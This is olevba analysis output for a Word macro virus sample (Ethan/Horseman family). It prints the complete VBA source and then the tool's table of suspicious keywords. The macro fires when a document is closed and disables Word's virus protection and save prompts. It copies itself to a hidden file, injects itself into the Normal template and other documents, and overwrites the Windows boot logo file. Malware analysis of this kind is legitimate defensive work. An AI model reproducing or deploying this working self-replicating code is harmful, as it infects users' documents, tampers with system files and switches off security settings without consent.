olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.dg-b7595d5f0cedefca0827225eb31078e330c16fcb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.dg-b7595d5f0cedefca0827225eb31078e330c16fcb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Olonho land Horseman
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If Dir("c:\windows\horseman", 6) = "" Or FileLen("c:\windows\horseman") <> 5572 Then
nf = FreeFile
Open "c:\windows\horseman" For Output As #nf
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
A = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #nf, A
Next i
Close #nf
SetAttr "c:\windows\horseman", 6
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Olonho land Horseman" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
horseman
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Olonho land Horseman" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
nf = FreeFile
Open "c:\windows\horseman" For Input As #nf
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #nf, A
t.CodeModule.InsertLines i, A
i = i + 1
Loop
q:
Close #nf
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Private Sub horseman()
Dim V(0 To 482) As Byte
Dim p(0 To 482) As Long
Dim i As Long
Dim A As Variant
Dim b As Variant
Dim C As Variant
Dim d As Variant
Dim e As Variant
Dim nf As Integer
A = Array(39, 40, 44, 43, 90739, 90743, 90756, 90764, 91059, 91063, 91076, 91077, 91084, 91379, 91383, 91396, 91397, 91404, 91699, 91703, 91717, 91724, 92019, 92023, 92029, 92037, 92045, 92339, 92343, 92349, 92357, 92358, 92365, 92370, 92659, 92663, 92669, 92678, 92685, 92690, 92979, 92983, 92989, 92999, 93005, 93010, 93299, 93303, 93309, 93319, 93320, 93325, 93330, 93619, 93623, 93629, 93640, 93645, 93650, 93939, 93940, 93943, 93949, 93960, 93965, 94259, 94260, 94263, 94269, 94280, 94281, 94284, 94285, 94580, 94583, 94584, 94589, 94600, 94601, 94603, 94604, 94900, 94901, 94903, 94904, 94905, 94909, 94920, 95221, 95222, 95223, 95224, 95225, 95226, 95229, 95238, 95239, 95240, 95242, 95243)
b = Array(95249, 95541, 95542, 95543, 95544, 95545, 95546, 95549, 95557, 95558, 95559, 95560, 95561, 95562, 95563, 95564, 95569, 95862, 95863, 95864, 95865, 95866, 95867, 95868, 95869, 95877, 95878, 95879, 95880, 95881, 95882, 95883, 95884, 95888, 96182, 96183, 96184, 96185, 96186, 96187, 96188, 96189, 96190, 96191, 96192, 96193, 96194, 96195, 96196, 96197, 96198, 96199, 96200, 96201, 96202, 96203, 96204, 96205, 96207, 96501, 96502, 96503, 96504, 96505, 96506, 96507, 96508, 96509, 96510, 96511, 96512, 96513, 96514, 96515, 96516, 96517, 96518, 96519, 96520, 96521, 96522, 96523, 96524, 96525, 96527, 96821, 96822, 96823, 96824, 96825, 96826, 96827, 96828, 96829, 96830, 96831, 96832, 96833, 96834, 96835)
C = Array(96836, 96837, 96838, 96839, 96840, 96841, 96842, 96843, 96844, 96845, 96847, 97141, 97142, 97143, 97144, 97145, 97146, 97147, 97148, 97149, 97150, 97151, 97152, 97153, 97154, 97155, 97156, 97157, 97158, 97159, 97160, 97161, 97162, 97163, 97164, 97165, 97166, 97462, 97463, 97464, 97465, 97466, 97467, 97468, 97469, 97470, 97471, 97472, 97473, 97474, 97475, 97476, 97477, 97478, 97479, 97480, 97481, 97482, 97483, 97484, 97782, 97783, 97784, 97785, 97786, 97787, 97788, 97789, 97790, 97791, 97792, 97793, 97794, 97795, 97796, 97797, 97798, 97799, 97800, 97801, 97802, 97803, 97804, 98101, 98103, 98104, 98105, 98106, 98107, 98108, 98109, 98110, 98111, 98112, 98113, 98114, 98115, 98116, 98117, 98118)
d = Array(98119, 98120, 98121, 98122, 98123, 98421, 98423, 98424, 98425, 98426, 98427, 98428, 98429, 98430, 98431, 98432, 98434, 98435, 98436, 98437, 98438, 98439, 98440, 98441, 98442, 98741, 98743, 98744, 98745, 98746, 98747, 98748, 98750, 98754, 98755, 98756, 98757, 98758, 98759, 98760, 98761, 99061, 99063, 99064, 99065, 99066, 99067, 99068, 99070, 99381, 99383, 99384, 99385, 99387, 99388, 99390, 99701, 99702, 99703, 99704, 99705, 99707, 99708, 99710, 100020, 100021, 100022, 100023, 100024, 100025, 100026, 100027, 100028, 100029, 100030, 100031, 100340, 100341, 100342, 100343, 100344, 100345, 100346, 100347, 100348, 100349, 100350, 100351, 100661, 100662, 100663, 100668, 100669, 100671, 100981, 100982, 100988, 100989, 100991, 101301)
e = Array(101308, 101309, 101311, 101621, 101628, 101631, 101951, 101957, 101958, 101959, 102271, 102274, 102275, 102276, 102591, 102593, 102594, 102595, 102596, 102911, 102912, 102913, 102914, 102915, 102916, 102918, 102919, 103231, 103232, 103233, 103234, 103235, 103236, 103237, 103238, 103551, 103552, 103553, 103554, 103555, 103556, 103557, 103872, 103873, 103874, 103875, 103876, 103877, 103878, 103879, 104192, 104193, 104194, 104195, 104196, 104197, 104198, 104512, 104513, 104514, 104515, 104516, 104832, 104833, 104834, 105152, 105472, 105792, 106112, 94923, 95547, 98433, 98102, 98422, 98742, 98749, 99062, 99069, 99382, 99386, 99389, 99706, 99709)
For i = 0 To 99
p(i) = A(i)
Next
For i = 0 To 99
p(i + 100) = b(i)
Next
For i = 0 To 99
p(i + 200) = C(i)
Next
For i = 0 To 99
p(i + 300) = d(i)
Next
For i = 0 To 82
p(i + 400) = e(i)
Next
V(0) = 206
V(1) = 14
V(2) = 14
V(3) = 216
For i = 4 To 468
V(i) = 186
Next
For i = 469 To 471
V(i) = 184
Next
For i = 472 To 482
V(i) = 226
Next
nf = FreeFile
Open "c:\windows\logos.sys" For Binary Access Write As #nf
For i = 0 To 482
Put #nf, p(i), V(i)
Next
Close #nf
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

